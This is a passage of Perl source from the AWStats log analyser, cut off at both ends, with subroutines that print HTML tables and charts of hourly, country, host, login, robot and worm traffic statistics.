                    "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vk'}\" height=\"$bredde_k\" width=\"6\""
                        . AltTitle(
                        "$Message[75]: " . Format_Bytes( $_time_k[$ix] ) )
                        . " />";
            }
            print "</td>\n";
        }
        print "</tr>\n";

        # Show hour lib
        print "<tr" . Tooltip(17) . ">";
        for ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {
            print "<th width=\"19\">$ix</th>\n"
            ;   # width=19 instead of 18 to avoid a MacOS browser bug.
        }
        print "</tr>\n";

        # Show clock icon
        print "<tr" . Tooltip(17) . ">\n";
        for ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {
            my $hrs = ( $ix >= 12 ? $ix - 12 : $ix );
            my $hre = ( $ix >= 12 ? $ix - 11 : $ix + 1 );
            my $apm = ( $ix >= 12 ? "pm"     : "am" );
            print
                "<td><img src=\"$DirIcons\/clock\/hr$hre.png\" width=\"12\" alt=\"$hrs:00 - $hre:00 $apm\" /></td>\n";
        }
        print "</tr>\n";
        print "</table>\n";
    }
    print "<br />\n";

    # Show data array for hours
    if ($AddDataArrayShowHoursStats) {
        print "<table width=\"650\"><tr>\n";
        print "<td align=\"center\"><center>\n";

        print "<table>\n";
        print
            "<tr><td width=\"80\" bgcolor=\"#$color_TableBGRowTitle\">$Message[20]</td>";
        if ( $ShowHoursStats =~ /P/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_p\""
                . Tooltip(3)
                . ">$Message[56]</td>";
        }
        if ( $ShowHoursStats =~ /H/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_h\""
                . Tooltip(4)
                . ">$Message[57]</td>";
        }
        if ( $ShowHoursStats =~ /B/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_k\""
                . Tooltip(5)
                . ">$Message[75]</td>";
        }
        print "</tr>";
        for ( my $ix = 0 ; $ix <= 11 ; $ix++ ) {
            my $monthix = ( $ix < 10 ? "0$ix" : "$ix" );
            print "<tr>";
            print "<td>$monthix</td>";
            if ( $ShowHoursStats =~ /P/i ) {
                print "<td>",
                    Format_Number($_time_p[$monthix] ? $_time_p[$monthix] : "0"),
                    "</td>";
            }
            if ( $ShowHoursStats =~ /H/i ) {
                print "<td>",
                    Format_Number($_time_h[$monthix] ? $_time_h[$monthix] : "0"),
                    "</td>";
            }
            if ( $ShowHoursStats =~ /B/i ) {
                print "<td>", Format_Bytes( int( $_time_k[$monthix] ) ),
                    "</td>";
            }
            print "</tr>\n";
        }
        print "</table>\n";

        print "</center></td>";
        print "<td width=\"10\">&nbsp;</td>";
        print "<td align=\"center\"><center>\n";

        print "<table>\n";
        print
            "<tr><td width=\"80\" bgcolor=\"#$color_TableBGRowTitle\">$Message[20]</td>";
        if ( $ShowHoursStats =~ /P/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_p\""
                . Tooltip(3)
                . ">$Message[56]</td>";
        }
        if ( $ShowHoursStats =~ /H/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_h\""
                . Tooltip(4)
                . ">$Message[57]</td>";
        }
        if ( $ShowHoursStats =~ /B/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_k\""
                . Tooltip(5)
                . ">$Message[75]</td>";
        }
        print "</tr>\n";
        for ( my $ix = 12 ; $ix <= 23 ; $ix++ ) {
            my $monthix = ( $ix < 10 ? "0$ix" : "$ix" );
            print "<tr>";
            print "<td>$monthix</td>";
            if ( $ShowHoursStats =~ /P/i ) {
                print "<td>",
                    Format_Number($_time_p[$monthix] ? $_time_p[$monthix] : "0"),
                    "</td>";
            }
            if ( $ShowHoursStats =~ /H/i ) {
                print "<td>",
                    Format_Number($_time_h[$monthix] ? $_time_h[$monthix] : "0"),
                    "</td>";
            }
            if ( $ShowHoursStats =~ /B/i ) {
                print "<td>", Format_Bytes( int( $_time_k[$monthix] ) ),
                    "</td>";
            }
            print "</tr>\n";
        }
        print "</table>\n";

        print "</center></td></tr></table>\n";
        print "<br />\n";
    }

    print "</center></td></tr>\n";
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the countries chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainCountries{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;

    if ($Debug) { debug( "ShowDomainsStats", 2 ); }
    print "$Center<a name=\"countries\">&nbsp;</a><br />\n";
    my $title =
        "$Message[25] ($Message[77] $MaxNbOf{'Domain'}) &nbsp; - &nbsp; <a href=\""
            . (
            $ENV{'GATEWAY_INTERFACE'}
                || !$StaticLinks
                ? XMLEncode("$AWScript${NewLinkParams}output=alldomains")
                : "$StaticLinks.alldomains.$StaticExt"
        )
            . "\"$NewLinkTarget>$Message[80]</a>";


    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=DOMAIN&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }

    &tab_head( "$title", 19, 0, 'countries' );

    my $total_u = my $total_v = my $total_p = my $total_h = my $total_k = 0;
    my $max_h = 1;
    foreach ( values %_domener_h ) {
        if ( $_ > $max_h ) { $max_h = $_; }
    }
    my $max_k = 1;
    foreach ( values %_domener_k ) {
        if ( $_ > $max_k ) { $max_k = $_; }
    }
    my $count = 0;

    &BuildKeyList(
        $MaxNbOf{'Domain'}, $MinHit{'Domain'},
        \%_domener_h,       \%_domener_p
    );

    # print the map
    if (scalar @keylist > 1){
        foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
        {
            my @blocklabel = ();
            my @valdata = ();
            my $cnt = 0;
            foreach my $key (@keylist) {
                push @valdata, int( $_domener_h{$key} );
                push @blocklabel, $DomainsHashIDLib{$key};
                $cnt++;
                if ($cnt > 99) { last; }
            }
            print "<tr><td colspan=\"7\" align=\"center\">";
            my $function = "ShowGraph_$pluginname";
            &$function(
                "AWStatsCountryMap",              "countries_map",
                0, 						\@blocklabel,
                0,           			0,
                0,              		0,
                0,          			\@valdata
            );
            print "</td></tr>";
        }
    }

    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"$WIDTHCOLICON\">&nbsp;</th><th colspan=\"2\">$Message[17]</th>";

    ## to add unique visitors and number of visits by calculation of average of the relation with total
    ## pages and total hits, and total visits and total unique
    ## by Josep Ruano @ CAPSiDE
    if ( $ShowDomainsStats =~ /U/i ) {
        print "<th bgcolor=\"#$color_u\" width=\"80\""
            . Tooltip(2)
            . ">$Message[11]</th>";
    }
    if ( $ShowDomainsStats =~ /V/i ) {
        print "<th bgcolor=\"#$color_v\" width=\"80\""
            . Tooltip(1)
            . ">$Message[10]</th>";
    }
    if ( $ShowDomainsStats =~ /P/i ) {
        print "<th bgcolor=\"#$color_p\" width=\"80\""
            . Tooltip(3)
            . ">$Message[56]</th>";
    }
    if ( $ShowDomainsStats =~ /H/i ) {
        print "<th bgcolor=\"#$color_h\" width=\"80\""
            . Tooltip(4)
            . ">$Message[57]</th>";
    }
    if ( $ShowDomainsStats =~ /B/i ) {
        print "<th bgcolor=\"#$color_k\" width=\"80\""
            . Tooltip(5)
            . ">$Message[75]</th>";
    }
    print "<th>&nbsp;</th>";
    print "</tr>\n";

    foreach my $key (@keylist) {
        my ( $_domener_u, $_domener_v );
        my $bredde_p = 0;
        my $bredde_h = 0;
        my $bredde_k = 0;
        my $bredde_u = 0;
        my $bredde_v = 0;
        if ( $max_h > 0 ) {
            $bredde_p =
                int( $BarWidth * $_domener_p{$key} / $max_h ) + 1;
        }    # use max_h to enable to compare pages with hits
        if ( $_domener_p{$key} && $bredde_p == 1 ) { $bredde_p = 2; }
        if ( $max_h > 0 ) {
            $bredde_h =
                int( $BarWidth * $_domener_h{$key} / $max_h ) + 1;
        }
        if ( $_domener_h{$key} && $bredde_h == 1 ) { $bredde_h = 2; }
        if ( $max_k > 0 ) {
            $bredde_k =
                int( $BarWidth * ( $_domener_k{$key} || 0 ) / $max_k ) +
                    1;
        }
        if ( $_domener_k{$key} && $bredde_k == 1 ) { $bredde_k = 2; }
        my $newkey = lc($key);
        if ( $newkey eq 'ip' || !$DomainsHashIDLib{$newkey} ) {
            print
                "<tr><td width=\"$WIDTHCOLICON\"><img src=\"$DirIcons\/flags\/ip.png\" height=\"14\""
                    . AltTitle("$Message[0]")
                    . " /></td><td class=\"aws\">$Message[0]</td><td>$newkey</td>";
        }
        else {
            print
                "<tr><td width=\"$WIDTHCOLICON\"><img src=\"$DirIcons\/flags\/$newkey.png\" height=\"14\""
                    . AltTitle("$newkey")
                    . " /></td><td class=\"aws\">$DomainsHashIDLib{$newkey}</td><td>$newkey</td>";
        }
        ## to add unique visitors and number of visits, by Josep Ruano @ CAPSiDE
        if ( $ShowDomainsStats =~ /U/i ) {
            $_domener_u = (
                $_domener_p{$key}
                    ? $_domener_p{$key} / $TotalPages
                    : 0
            );
            $_domener_u += ( $_domener_h{$key} / $TotalHits );
            $_domener_u =
                sprintf( "%.0f", ( $_domener_u * $TotalUnique ) / 2 );
            print "<td>".Format_Number($_domener_u)." ("
                . sprintf( "%.1f%", 100 * $_domener_u / $TotalUnique )
                . ")</td>";
        }
        if ( $ShowDomainsStats =~ /V/i ) {
            $_domener_v = (
                $_domener_p{$key}
                    ? $_domener_p{$key} / $TotalPages
                    : 0
            );
            $_domener_v += ( $_domener_h{$key} / $TotalHits );
            $_domener_v =
                sprintf( "%.0f", ( $_domener_v * $TotalVisits ) / 2 );
            print "<td>".Format_Number($_domener_v)." ("
                . sprintf( "%.1f%", 100 * $_domener_v / $TotalVisits )
                . ")</td>";
        }

        if ( $ShowDomainsStats =~ /P/i ) {
            print "<td>"
                . ( $_domener_p{$key} ? Format_Number($_domener_p{$key}) : '&nbsp;' )
                . "</td>";
        }
        if ( $ShowDomainsStats =~ /H/i ) {
            print "<td>".Format_Number($_domener_h{$key})."</td>";
        }
        if ( $ShowDomainsStats =~ /B/i ) {
            print "<td>" . Format_Bytes( $_domener_k{$key} ) . "</td>";
        }
        print "<td class=\"aws\">";

        if ( $ShowDomainsStats =~ /P/i ) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"5\""
                    . AltTitle("")
                    . " /><br />\n";
        }
        if ( $ShowDomainsStats =~ /H/i ) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hh'}\" width=\"$bredde_h\" height=\"5\""
                    . AltTitle("")
                    . " /><br />\n";
        }
        if ( $ShowDomainsStats =~ /B/i ) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hk'}\" width=\"$bredde_k\" height=\"5\""
                    . AltTitle("") . " />";
        }
        print "</td>";
        print "</tr>\n";

        $total_u += $_domener_u;
        $total_v += $_domener_v;
        $total_p += $_domener_p{$key};
        $total_h += $_domener_h{$key};
        $total_k += $_domener_k{$key} || 0;
        $count++;
    }
    my $rest_u = $TotalUnique - $total_u;
    my $rest_v = $TotalVisits - $total_v;
    my $rest_p = $TotalPages - $total_p;
    my $rest_h = $TotalHits - $total_h;
    my $rest_k = $TotalBytes - $total_k;
    if (   $rest_u > 0
        || $rest_v > 0
        || $rest_p > 0
        || $rest_h > 0
        || $rest_k > 0 )
    {    # All other domains (known or not)
        print
            "<tr><td width=\"$WIDTHCOLICON\">&nbsp;</td><td colspan=\"2\" class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        if ( $ShowDomainsStats =~ /U/i ) { print "<td>$rest_u</td>"; }
        if ( $ShowDomainsStats =~ /V/i ) { print "<td>$rest_v</td>"; }
        if ( $ShowDomainsStats =~ /P/i ) { print "<td>$rest_p</td>"; }
        if ( $ShowDomainsStats =~ /H/i ) { print "<td>$rest_h</td>"; }
        if ( $ShowDomainsStats =~ /B/i ) {
            print "<td>" . Format_Bytes($rest_k) . "</td>";
        }
        print "<td class=\"aws\">&nbsp;</td>";
        print "</tr>\n";
    }
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the hosts chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainHosts{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;

    if ($Debug) { debug( "ShowHostsStats", 2 ); }
    print "$Center<a name=\"visitors\">&nbsp;</a><br />\n";
    my $title =
        "$Message[81] ($Message[77] $MaxNbOf{'HostsShown'}) &nbsp; - &nbsp; <a href=\""
            . (
            $ENV{'GATEWAY_INTERFACE'}
                || !$StaticLinks
                ? XMLEncode("$AWScript${NewLinkParams}output=allhosts")
                : "$StaticLinks.allhosts.$StaticExt"
        )
            . "\"$NewLinkTarget>$Message[80]</a> &nbsp; - &nbsp; <a href=\""
            . (
            $ENV{'GATEWAY_INTERFACE'}
                || !$StaticLinks
                ? XMLEncode("$AWScript${NewLinkParams}output=lasthosts")
                : "$StaticLinks.lasthosts.$StaticExt"
        )
            . "\"$NewLinkTarget>$Message[9]</a> &nbsp; - &nbsp; <a href=\""
            . (
            $ENV{'GATEWAY_INTERFACE'}
                || !$StaticLinks
                ? XMLEncode("$AWScript${NewLinkParams}output=unknownip")
                : "$StaticLinks.unknownip.$StaticExt"
        )
            . "\"$NewLinkTarget>$Message[45]</a>";

    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=VISITOR&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }

    &tab_head( "$title", 19, 0, 'visitors' );

    &BuildKeyList( $MaxNbOf{'HostsShown'}, $MinHit{'Host'}, \%_host_h,
        \%_host_p );

    # Graph the top five in a pie chart
    if (scalar @keylist > 1){
        foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
        {
            my @blocklabel = ();
            my @valdata = ();
            my @valcolor = ($color_p);

            my $cnt = 0;
            my $suma = 0;
            foreach my $key (@keylist) {
                $suma=$suma + ( $_host_h{$key});
                $cnt++;
                if ($cnt > 4) { last; }
            }

            my $cnt = 0;
            foreach my $key (@keylist) {
                push @valdata, int( $_host_h{$key} / $suma * 1000 ) / 10;
                push @blocklabel, "$key";
                $cnt++;
                if ($cnt > 4) { last; }
            }

            print "<tr><td colspan=\"7\">";
            my $function = "ShowGraph_$pluginname";
            &$function(
                "Hosts",              "hosts",
                0, 						\@blocklabel,
                0,           			\@valcolor,
                0,              		0,
                0,          			\@valdata
            );
            print "</td></tr>";
        }
    }

    print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
    print "<th>";
    if ( $MonthRequired ne 'all' ) {
        print
            "$Message[81] : ".Format_Number($TotalHostsKnown)." $Message[82], ".Format_Number($TotalHostsUnknown)." $Message[1]<br />".Format_Number($TotalUnique)." $Message[11]</th>";
    }
    else {
        print "$Message[81] : " . ( scalar keys %_host_h ) . "</th>";
    }
    &HTMLShowHostInfo('__title__');
    if ( $ShowHostsStats =~ /P/i ) {
        print "<th bgcolor=\"#$color_p\" width=\"80\""
            . Tooltip(3)
            . ">$Message[56]</th>";
    }
    if ( $ShowHostsStats =~ /H/i ) {
        print "<th bgcolor=\"#$color_h\" width=\"80\""
            . Tooltip(4)
            . ">$Message[57]</th>";
    }
    if ( $ShowHostsStats =~ /B/i ) {
        print "<th bgcolor=\"#$color_k\" width=\"80\""
            . Tooltip(5)
            . ">$Message[75]</th>";
    }
    if ( $ShowHostsStats =~ /L/i ) {
        print "<th width=\"120\">$Message[9]</th>";
    }
    print "</tr>\n";
    my $total_p = my $total_h = my $total_k = 0;
    my $count = 0;

    my $regipv4 = qr/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;

    if ( $DynamicDNSLookup == 2 ) {
        # Use static DNS file
        &Read_DNS_Cache( \%MyDNSTable, "$DNSStaticCacheFile", "", 1 );
    }

    foreach my $key (@keylist) {
        print "<tr>";
        print "<td class=\"aws\">$key";

        if ($DynamicDNSLookup) {
            # Dynamic reverse DNS lookup
            if ($key =~ /$regipv4/o) {
                my $lookupresult=lc(gethostbyaddr(pack("C4",split(/\./,$key)),AF_INET));	# This may be slow
                if (! $lookupresult || $lookupresult =~ /$regipv4/o || ! IsAscii($lookupresult)) {
                    if ( $DynamicDNSLookup == 2 ) {
                        # Check static DNS file
                        $lookupresult = $MyDNSTable{$key};
                        if ($lookupresult) { print " ($lookupresult)"; }
                        else { print ""; }
                    }
                    else { print ""; }
                }
                else { print " ($lookupresult)"; }
            }
        }

        print "</td>";
        &HTMLShowHostInfo($key);
        if ( $ShowHostsStats =~ /P/i ) {
            print '<td>' . ( Format_Number($_host_p{$key}) || "&nbsp;" ) . '</td>';
        }
        if ( $ShowHostsStats =~ /H/i ) {
            print "<td>".Format_Number($_host_h{$key})."</td>";
        }
        if ( $ShowHostsStats =~ /B/i ) {
            print '<td>' . Format_Bytes( $_host_k{$key} ) . '</td>';
        }
        if ( $ShowHostsStats =~ /L/i ) {
            print '<td nowrap="nowrap">'
                . (
                $_host_l{$key}
                    ? Format_Date( $_host_l{$key}, 1 )
                    : '-'
            )
                . '</td>';
        }
        print "</tr>\n";
        $total_p += $_host_p{$key};
        $total_h += $_host_h{$key};
        $total_k += $_host_k{$key} || 0;
        $count++;
    }
    my $rest_p = $TotalPages - $total_p;
    my $rest_h = $TotalHits - $total_h;
    my $rest_k = $TotalBytes - $total_k;
    if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )
    {    # All other visitors (known or not)
        print "<tr>";
        print
            "<td class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        &HTMLShowHostInfo('');
        if ( $ShowHostsStats =~ /P/i ) { print "<td>".Format_Number($rest_p)."</td>"; }
        if ( $ShowHostsStats =~ /H/i ) { print "<td>".Format_Number($rest_h)."</td>"; }
        if ( $ShowHostsStats =~ /B/i ) {
            print "<td>" . Format_Bytes($rest_k) . "</td>";
        }
        if ( $ShowHostsStats =~ /L/i ) { print "<td>&nbsp;</td>"; }
        print "</tr>\n";
    }
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the logins chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainLogins{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;

    if ($Debug) { debug( "ShowAuthenticatedUsers", 2 ); }
    print "$Center<a name=\"logins\">&nbsp;</a><br />\n";
    my $title =
        "$Message[94] ($Message[77] $MaxNbOf{'LoginShown'}) &nbsp; - &nbsp; <a href=\""
            . (
            $ENV{'GATEWAY_INTERFACE'}
                || !$StaticLinks
                ? XMLEncode("$AWScript${NewLinkParams}output=alllogins")
                : "$StaticLinks.alllogins.$StaticExt"
        )
            . "\"$NewLinkTarget>$Message[80]</a>";
    if ( $ShowAuthenticatedUsers =~ /L/i ) {
        $title .= " &nbsp; - &nbsp; <a href=\""
            . (
            $ENV{'GATEWAY_INTERFACE'}
                || !$StaticLinks
                ? XMLEncode("$AWScript${NewLinkParams}output=lastlogins")
                : "$StaticLinks.lastlogins.$StaticExt"
        )
            . "\"$NewLinkTarget>$Message[9]</a>";
    }
    &tab_head( "$title", 19, 0, 'logins' );
    print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>$Message[94] : "
        . Format_Number(( scalar keys %_login_h )) . "</th>";
    &HTMLShowUserInfo('__title__');
    if ( $ShowAuthenticatedUsers =~ /P/i ) {
        print "<th bgcolor=\"#$color_p\" width=\"80\""
            . Tooltip(3)
            . ">$Message[56]</th>";
    }
    if ( $ShowAuthenticatedUsers =~ /H/i ) {
        print "<th bgcolor=\"#$color_h\" width=\"80\""
            . Tooltip(4)
            . ">$Message[57]</th>";
    }
    if ( $ShowAuthenticatedUsers =~ /B/i ) {
        print "<th bgcolor=\"#$color_k\" width=\"80\""
            . Tooltip(5)
            . ">$Message[75]</th>";
    }
    if ( $ShowAuthenticatedUsers =~ /L/i ) {
        print "<th width=\"120\">$Message[9]</th>";
    }
    print "</tr>\n";
    my $total_p = my $total_h = my $total_k = 0;
    my $max_h = 1;
    foreach ( values %_login_h ) {
        if ( $_ > $max_h ) { $max_h = $_; }
    }
    my $max_k = 1;
    foreach ( values %_login_k ) {
        if ( $_ > $max_k ) { $max_k = $_; }
    }
    my $count = 0;
    &BuildKeyList( $MaxNbOf{'LoginShown'}, $MinHit{'Login'}, \%_login_h,
        \%_login_p );
    foreach my $key (@keylist) {
        my $bredde_p = 0;
        my $bredde_h = 0;
        my $bredde_k = 0;
        if ( $max_h > 0 ) {
            $bredde_p = int( $BarWidth * $_login_p{$key} / $max_h ) + 1;
        }    # use max_h to enable to compare pages with hits
        if ( $max_h > 0 ) {
            $bredde_h = int( $BarWidth * $_login_h{$key} / $max_h ) + 1;
        }
        if ( $max_k > 0 ) {
            $bredde_k = int( $BarWidth * $_login_k{$key} / $max_k ) + 1;
        }
        print "<tr><td class=\"aws\">$key</td>";
        &HTMLShowUserInfo($key);
        if ( $ShowAuthenticatedUsers =~ /P/i ) {
            print "<td>"
                . ( $_login_p{$key} ? Format_Number($_login_p{$key}) : "&nbsp;" )
                . "</td>";
        }
        if ( $ShowAuthenticatedUsers =~ /H/i ) {
            print "<td>".Format_Number($_login_h{$key})."</td>";
        }
        if ( $ShowAuthenticatedUsers =~ /B/i ) {
            print "<td>" . Format_Bytes( $_login_k{$key} ) . "</td>";
        }
        if ( $ShowAuthenticatedUsers =~ /L/i ) {
            print "<td>"
                . (
                $_login_l{$key}
                    ? Format_Date( $_login_l{$key}, 1 )
                    : '-'
            )
                . "</td>";
        }
        print "</tr>\n";
        $total_p += $_login_p{$key};
        $total_h += $_login_h{$key};
        $total_k += $_login_k{$key};
        $count++;
    }
    my $rest_p = $TotalPages - $total_p;
    my $rest_h = $TotalHits - $total_h;
    my $rest_k = $TotalBytes - $total_k;
    if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )
    {    # All other logins
        print
            "<tr><td class=\"aws\"><span style=\"color: #$color_other\">"
                . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
                . "$Message[125]"
                . ( $PageDir eq 'rtl' ? "</span>" : "" )
                . "</span></td>";
        &HTMLShowUserInfo('');
        if ( $ShowAuthenticatedUsers =~ /P/i ) {
            print "<td>" . ( $rest_p ? Format_Number($rest_p) : "&nbsp;" ) . "</td>";
        }
        if ( $ShowAuthenticatedUsers =~ /H/i ) {
            print "<td>".Format_Number($rest_h)."</td>";
        }
        if ( $ShowAuthenticatedUsers =~ /B/i ) {
            print "<td>" . Format_Bytes($rest_k) . "</td>";
        }
        if ( $ShowAuthenticatedUsers =~ /L/i ) {
            print "<td>&nbsp;</td>";
        }
        print "</tr>\n";
    }
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the robots chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainRobots{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;

    if ($Debug) { debug( "ShowRobotStats", 2 ); }
    print "$Center<a name=\"robots\">&nbsp;</a><br />\n";

    my $title = "$Message[53] ($Message[77] $MaxNbOf{'RobotShown'}) &nbsp; - &nbsp; <a href=\""
        . (
        $ENV{'GATEWAY_INTERFACE'}
            || !$StaticLinks
            ? XMLEncode("$AWScript${NewLinkParams}output=allrobots")
            : "$StaticLinks.allrobots.$StaticExt"
    )
        . "\"$NewLinkTarget>$Message[80]</a> &nbsp; - &nbsp; <a href=\""
        . (
        $ENV{'GATEWAY_INTERFACE'}
            || !$StaticLinks
            ? XMLEncode("$AWScript${NewLinkParams}output=lastrobots")
            : "$StaticLinks.lastrobots.$StaticExt"
    )
        . "\"$NewLinkTarget>$Message[9]</a>";

    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=ROBOT&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }

    &tab_head( "$title", 19, 0, 'robots');

    print "<tr bgcolor=\"#$color_TableBGRowTitle\""
        . Tooltip(16) . "><th>"
        . Format_Number(( scalar keys %_robot_h ))
        . " $Message[51]*</th>";
    if ( $ShowRobotsStats =~ /H/i ) {
        print
            "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th>";
    }
    if ( $ShowRobotsStats =~ /B/i ) {
        print
            "<th bgcolor=\"#$color_k\" width=\"80\">$Message[75]</th>";
    }
    if ( $ShowRobotsStats =~ /L/i ) {
        print "<th width=\"120\">$Message[9]</th>";
    }
    print "</tr>\n";
    my $total_p = my $total_h = my $total_k = my $total_r = 0;
    my $count = 0;
    &BuildKeyList( $MaxNbOf{'RobotShown'}, $MinHit{'Robot'}, \%_robot_h,
        \%_robot_h );
    foreach my $key (@keylist) {
        print "<tr><td class=\"aws\">"
            . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
            . ( $RobotsHashIDLib{$key} ? $RobotsHashIDLib{$key} : $key )
            . ( $PageDir eq 'rtl' ? "</span>" : "" ) . "</td>";
        if ( $ShowRobotsStats =~ /H/i ) {
            print "<td>"
                . Format_Number(( $_robot_h{$key} - $_robot_r{$key} ))
                . ( $_robot_r{$key} ? "+$_robot_r{$key}" : "" ) . "</td>";
        }
        if ( $ShowRobotsStats =~ /B/i ) {
            print "<td>" . Format_Bytes( $_robot_k{$key} ) . "</td>";
        }
        if ( $ShowRobotsStats =~ /L/i ) {
            print "<td>"
                . (
                $_robot_l{$key}
                    ? Format_Date( $_robot_l{$key}, 1 )
                    : '-'
            )
                . "</td>";
        }
        print "</tr>\n";

        #$total_p += $_robot_p{$key};
        $total_h += $_robot_h{$key};
        $total_k += $_robot_k{$key} || 0;
        $total_r += $_robot_r{$key} || 0;
        $count++;
    }

    # For bots we need to count Totals
    my $TotalPagesRobots =
        0;    #foreach (values %_robot_p) { $TotalPagesRobots+=$_; }
    my $TotalHitsRobots = 0;
    foreach ( values %_robot_h ) { $TotalHitsRobots += $_; }
    my $TotalBytesRobots = 0;
    foreach ( values %_robot_k ) { $TotalBytesRobots += $_; }
    my $TotalRRobots = 0;
    foreach ( values %_robot_r ) { $TotalRRobots += $_; }
    my $rest_p = 0;    #$rest_p=$TotalPagesRobots-$total_p;
    my $rest_h = $TotalHitsRobots - $total_h;
    my $rest_k = $TotalBytesRobots - $total_k;
    my $rest_r = $TotalRRobots - $total_r;

    if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 || $rest_r > 0 )
    {               # All other robots
        print
            "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        if ( $ShowRobotsStats =~ /H/i ) {
            print "<td>"
                . Format_Number(( $rest_h - $rest_r ))
                . ( $rest_r ? "+$rest_r" : "" ) . "</td>";
        }
        if ( $ShowRobotsStats =~ /B/i ) {
            print "<td>" . ( Format_Bytes($rest_k) ) . "</td>";
        }
        if ( $ShowRobotsStats =~ /L/i ) { print "<td>&nbsp;</td>"; }
        print "</tr>\n";
    }
    &tab_end(
        "* $Message[156]" . ( $TotalRRobots ? " $Message[157]" : "" ) );
}

#------------------------------------------------------------------------------
# Function:     Prints the worms chart and table
# Parameters:   -
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainWorms{
    if ($Debug) { debug( "ShowWormsStats", 2 ); }
    print "$Center<a name=\"worms\">&nbsp;</a><br />\n";
    &tab_head( "$Message[163] ($Message[77] $MaxNbOf{'WormsShown'})",
        19, 0, 'worms' );
    print "<tr bgcolor=\"#$color_TableBGRowTitle\"" . Tooltip(21) . ">";
    print "<th>" . Format_Number(( scalar keys %_worm_h )) . " $Message[164]*</th>";
    print "<th>$Message[167]</th>";
    if ( $ShowWormsStats =~ /H/i ) {
        print
            "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th>";
    }
    if ( $ShowWormsStats =~ /B/i ) {
        print
            "<th bgcolor=\"#$color_k\" width=\"80\">$Message[75]</th>";
    }
    if ( $ShowWormsStats =~ /L/i ) {
        print "<th width=\"120\">$Message[9]</th>";
    }
    print "</tr>\n";
    my $total_p = my $total_h = my $total_k = 0;
    my $count = 0;
    &BuildKeyList( $MaxNbOf{'WormsShown'}, $MinHit{'Worm'}, \%_worm_h,
        \%_worm_h );
    foreach my $key (@keylist) {
        print "<tr>";
        print "<td class=\"aws\">"
            . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
            . ( $WormsHashLib{$key} ? $WormsHashLib{$key} : $key )
            . ( $PageDir eq 'rtl' ? "</span>" : "" ) . "</td>";
        print "<td class=\"aws\">"
            . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
            . ( $WormsHashTarget{$key} ? $WormsHashTarget{$key} : $key )
            . ( $PageDir eq 'rtl' ? "</span>" : "" ) . "</td>";
        if ( $ShowWormsStats =~ /H/i ) {
            print "<td>" . Format_Number($_worm_h{$key}) . "</td>";
